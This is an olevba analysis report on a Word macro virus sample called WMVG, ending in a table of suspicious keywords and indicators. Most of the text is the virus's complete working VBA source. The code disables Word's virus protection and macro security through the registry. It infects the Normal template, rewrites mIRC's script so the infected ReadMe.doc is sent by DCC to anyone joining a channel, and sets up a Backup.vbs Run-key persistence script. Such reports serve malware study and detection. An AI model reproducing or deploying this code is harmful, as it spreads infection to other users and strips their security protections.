olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.WMVG-64d5569c142f0f92f13135303dc7bff77f47d4f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.WMVG-64d5569c142f0f92f13135303dc7bff77f47d4f8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
Private Sub Document_Open()
On Error Resume Next

' Virus Name : hhh
' VirusAuthor : nec
' Comments : sf
' Date : 10/2/2002

' A Virus Created By The WalruS Macro Virus Generator v1.00 (WMVG)

With Options
     .VirusProtection = 0
     .SaveNormalPrompt = 0
     .ConfirmConversions = 0
End With
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 CommandBars("Macro").Controls("Security...").Enabled = False
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
Set FOD6746 = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set MNJ7112 = ActiveDocument.VBProject.VBComponents(1).CodeModule
If FOD6746.Lines(1, 1) <> "'" Then
FOD6746.DeleteLines 1, FOD6746.CountOfLines
FOD6746.InsertLines 1, MNJ7112.Lines(1, MNJ7112.CountOfLines)
ElseIf MNJ7112.Lines(1, 1) <> "'" Then
MNJ7112.DeleteLines 1, MNJ7112.CountOfLines
MNJ7112.InsertLines 1, FOD6746.Lines(1, FOD6746.CountOfLines)
ActiveDocument.Save
End If
Set IOE1644 = BUU4965
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\WalruS\WMVG", "Installed") <> "True" Then
Exists = Dir("c:\mirc\mirc32.exe")
If Exists = "" Then
Exit Sub
Else
dropped = Dir("c:\mirc\download\ReadMe.doc")
If dropped = "" Then ActiveDocument.SaveAs "c:\mirc\download\ReadMe.doc"
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\ReadMe.doc }"
Print #1, "n1=on 1:CONNECT: {"
Print #1, "n2=  /join #virus "
Print #1, "n3=  /msg #virus Im Infected With A Virus Created By WMVG"
Print #1, "n4= /part #virus"
Print #1, "n5= /clear"
Print #1, "n6= /motd"
Print #1, "n7= }"
Close #1
End If
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\WalruS\WMVG", "Installed") <> "True" Then
Open "C:\Windows\Backup.drv" For Output As #1
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 100)
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WMVG") = "C:\Windows\Backup.vbs"
Open "C:\Windows\Backup.vbs" For Output As #1
Print #1, "' Backup.vbs for WMVG by The WalruS"
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
Print #1, "For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\Backup.drv"")"
Print #1, "Backup.Application.Quit"
Close #1
End If
Call RNJ6484
End Sub
Private Sub RNJ6484()
On Error Resume Next
Do
DoEvents
Randomize
If Int(Rnd * 10000) = 2 Then
Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMinimize
Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMaximize
End If
Loop
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |Backup.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

